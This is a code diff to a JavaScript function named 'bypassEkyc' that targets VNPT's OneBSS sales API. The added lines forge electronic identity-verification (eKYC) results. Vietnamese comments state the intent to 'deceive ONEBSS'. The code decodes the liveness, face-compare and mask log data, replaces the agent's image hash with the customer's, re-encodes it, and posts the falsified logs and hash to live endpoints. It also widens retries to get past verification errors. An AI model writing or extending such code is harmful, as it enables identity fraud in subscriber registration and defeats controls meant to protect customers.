@@ -779,15 +779,33 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
 
         // 9. Log eKYC ket qua AI len ONEBSS
         btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 9/13: Ghi log eKYC...';
+        
+        // Cố tình sửa Hash của Agent thành Hash của Khách hàng trong Log của IDG AI để lừa ONEBSS
+        let fakeMaskData = maskData, fakeLivenessData = livenessData, fakeCompareData = compareData;
+        if (fastMode && realImageHash && idgVerifyHash !== p_image_hash) {
+            console.log('[SPOOF] Đánh tráo Hash trong Log IDG AI...');
+            const swapHash = (dataObj) => {
+                try {
+                    if (!dataObj || !dataObj.dataBase64) return dataObj;
+                    let decoded = atob(dataObj.dataBase64);
+                    decoded = decoded.split(idgVerifyHash).join(p_image_hash);
+                    return { ...dataObj, dataBase64: btoa(decoded) };
+                } catch (e) { return dataObj; }
+            };
+            fakeMaskData = swapHash(maskData);
+            fakeLivenessData = swapHash(livenessData);
+            fakeCompareData = swapHash(compareData);
+        }
+
         const logEkycPayload = {
             p_so_tb: phone,
-            p_image_hash: idgVerifyHash,
+            p_image_hash: p_image_hash, // Gửi hash của KH
             p_challenge_code: challengeCode,
             p_client_session: clientSession,
             menu_id: 810241,
-            p_liveness: JSON.stringify(typeof livenessData !== 'undefined' ? livenessData : {}),
-            p_compare: JSON.stringify(typeof compareData !== 'undefined' ? compareData : {}),
-            p_mask: JSON.stringify(typeof maskData !== 'undefined' ? maskData : {})
+            p_liveness: JSON.stringify(fakeLivenessData || {}),
+            p_compare: JSON.stringify(fakeCompareData || {}),
+            p_mask: JSON.stringify(fakeMaskData || {})
         };
 
         await fetch('https://api-onebss.vnpt.vn/app-banhang/Ekyc/log_ekyc', {
@@ -843,20 +861,20 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
         btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 13/13: Xac thuc hinh anh...';
 
         // Thu truoc voi format 84XXXXXXXXX
-        console.log(`[xacthuc_hinhanh] Thu format E164: ${phoneE164} | hash=${idgVerifyHash}`);
+        console.log(`[xacthuc_hinhanh] Thu format E164: ${phoneE164} | hash=${p_image_hash}`);
         let xacthucRes = await fetch('https://api-onebss.vnpt.vn/app-banhang/thietbi_thuebao/xacthuc_hinhanh', {
             method: 'POST',
             headers: { ...baseHeaders, 'Content-Type': 'application/json' },
-            body: JSON.stringify({ p_so_tb: phoneE164, p_image_hash: idgVerifyHash, client_session: clientSession, menu_id: 810241 })
+            body: JSON.stringify({ p_so_tb: phoneE164, p_image_hash: p_image_hash, client_session: clientSession, menu_id: 810241 })
         });
         let xacthucData = await xacthucRes.json();
         console.log(`[xacthuc_hinhanh] ${phoneE164}:`, xacthucData.error_code, xacthucData.message?.substring(0,80));
 
         // Neu format 84 loi "IDG invalid" hoac "type3" thi thu format 0XXXXXXXXX
         const needRetry = xacthucData.error !== '200' && (
-            xacthucData.message?.includes('IDG') || xacthucData.message?.includes('anh chan dung')
+            xacthucData.message?.includes('IDG') || xacthucData.message?.includes('type3') || xacthucData.error_code === 'BSS-00004002'
         );
-        if (needRetry && phone0 !== phoneE164) {
+        if (needRetry) {
             console.log(`[xacthuc_hinhanh] Retry voi format 0-prefix: ${phone0}`);
             xacthucRes = await fetch('https://api-onebss.vnpt.vn/app-banhang/thietbi_thuebao/xacthuc_hinhanh', {
                 method: 'POST',
